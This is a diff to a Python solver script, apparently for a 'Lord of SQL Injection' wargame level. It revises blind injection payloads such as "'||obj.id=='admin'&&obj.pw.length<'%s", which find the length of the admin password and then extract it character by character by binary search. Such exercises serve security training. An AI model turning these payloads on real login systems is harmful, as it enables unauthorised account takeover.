@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import los
+# import los_bak as los
 import los_cookies as lc
 
 
@@ -34,12 +35,14 @@ def main():
     inj_param = 'pw'
     other_param = {'id': 'admin'}
 
-    payload = "'||obj.pw.length>'%s"
+    # payload = "'||obj.pw.length<'%s"
+    payload = "'||obj.id=='admin'&&obj.pw.length<'%s"
     p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
     len_of_key = p.find_key_len(check_func)
 
     p.payload = f"'||obj.id=='admin'&&obj.pw[%d]<'%s"
-    result = p.find_binary(check_func, len_of_key, left=48, letter=True, start_i=0)
+    result = p.find_binary(check_func, len_of_key, left=48, mode='letter', start_i=0)
+    # result = p.find_binary(check_func, len_of_key, left=48, letter=True, start_i=0)
 
     p.payload = result
     response = p.my_request()
